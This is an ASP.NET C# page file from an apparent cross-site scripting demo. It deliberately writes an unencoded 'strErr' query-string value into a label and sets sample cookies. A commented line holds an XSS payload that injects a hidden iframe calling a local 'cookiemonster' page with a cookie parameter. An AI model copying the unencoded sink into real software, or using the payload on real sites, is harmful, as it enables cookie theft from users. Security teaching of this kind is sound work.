using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace CrossSiteScripting
{
    public partial class master : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            FakeCookies();
            string strQs = string.Empty;
            if (Request.QueryString["strErr"] != null)
            {
                strQs = Request.QueryString["strErr"] as string;
                lblDisplayErr.Text = strQs;
                //lblDisplayErr.Text = "<script> var s = '<IFRAME style = \"display:none\" SRC = \"http://localhost:62460/cookiemonster.aspx?c=test\" ></ IFRAME > ';document.write(s)</script>";

            }
            ReadFromCookies();
        }

        void ReadFromCookies()
        {
            lblCookies.Text = string.Empty;
            if (Response.Cookies["name"] != null)
            {
                HttpCookie aCookie = Request.Cookies["name"];
                if (!string.IsNullOrEmpty(aCookie.Value))
                {
                    lblCookies.Text = "Data from cookies:" + aCookie.Value;
                }
            }

        }

        //create cookies
        void FakeCookies()
        {
            Response.Cookies["name"].Value = "Kyle";
            Response.Cookies["name"].Expires = DateTime.Now.AddDays(1);
            Response.Cookies["age"].Value = "23";
            Response.Cookies["age"].Expires = DateTime.Now.AddDays(1);


        }
    }
}